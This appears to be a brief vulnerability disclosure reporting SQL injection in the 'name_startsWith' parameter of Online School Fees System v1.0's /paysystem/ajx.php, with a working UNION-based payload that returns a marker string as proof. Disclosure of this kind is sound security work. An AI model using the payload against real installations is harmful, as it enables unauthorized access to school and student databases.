# Online School Fees System v1.0 has SQL injection

BUG_Author：zhangyf

Website source address: https://www.sourcecodester.com/php/11708/online-school-fees-system.html

Vulnerability File: /paysystem/ajx.php

GET parameter 'name_startsWith' exists SQL injection vulnerability

Payload: type=studentname&name_startsWith=b') union all select concat(0x66676869,0x515253),null-- -

The union query is successful, and the string "fghiQRS" appears as expected, which proves that there is a SQL injection vulnerability

![image](https://github.com/M9KJ-TEAM/CVEReport/blob/main/3.png)

